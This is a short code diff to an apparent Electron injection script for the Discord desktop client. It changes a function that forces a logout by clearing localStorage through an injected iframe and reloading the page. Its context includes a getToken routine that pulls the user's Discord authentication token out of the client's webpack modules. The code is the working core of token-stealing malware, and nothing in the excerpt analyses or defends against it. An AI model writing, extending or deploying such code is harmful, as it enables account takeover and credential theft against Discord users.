@@ -8,7 +8,6 @@ const querystring = require('querystring');
 const {
     BrowserWindow,
     session,
-    app
 } = require('electron');
 
 const CONFIG = {
@@ -113,11 +112,8 @@ const executeJS = script => {
 };
 
 const clearAllUserData = () => {
-    const window = BrowserWindow.getAllWindows()[0];
-    window.webContents.session.flushStorageData();
-    window.webContents.session.clearStorageData();
-    app.relaunch();
-    app.exit();
+    executeJS("document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.clear()");
+    executeJS("location.reload()");
 };
 
 const getToken = async () => await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
